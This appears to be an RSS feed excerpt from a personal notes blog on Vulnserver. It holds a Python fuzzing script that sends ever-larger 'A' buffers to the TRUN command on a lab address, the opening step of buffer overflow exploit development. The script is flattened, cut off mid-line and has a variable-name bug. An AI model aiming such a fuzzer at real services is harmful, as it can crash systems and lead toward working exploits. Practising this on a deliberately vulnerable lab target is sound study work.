channel.title: Vulnserver on My notes and snippets

item.title: TRUN
item.description: trun Fuzzing #!/usr/bin/python import socket,sys from time import sleep ## Fuzzing address = '192.168.136.130' port = 9999 offset = 100 while True: try: buffer = b"" # empty byte var buffer += b"A"*offset # junk times offset print(f'[+] Sending buffer: {str(len(buffer))} bytes') s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((address,port)) s.recv(1024) s.send(b"TRUN /.:/%s \r\n" % buffer) offset += 100 sleep(1) except RuntimeError as Err: print(f'[!] Unable to connect to the application. {err}') sys.exit(0) finally: s.
